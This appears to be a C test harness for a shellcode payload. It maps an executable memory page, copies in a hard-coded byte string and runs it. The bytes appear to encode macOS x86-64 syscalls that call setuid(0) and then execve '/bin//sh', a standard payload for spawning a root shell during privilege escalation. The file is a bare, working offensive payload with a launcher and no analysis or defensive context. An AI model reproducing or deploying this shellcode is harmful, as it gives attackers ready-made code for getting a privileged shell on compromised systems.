#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char shellcode[] =
"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
"\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68";
 
int main(int argc, char **argv) {
 
    void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}
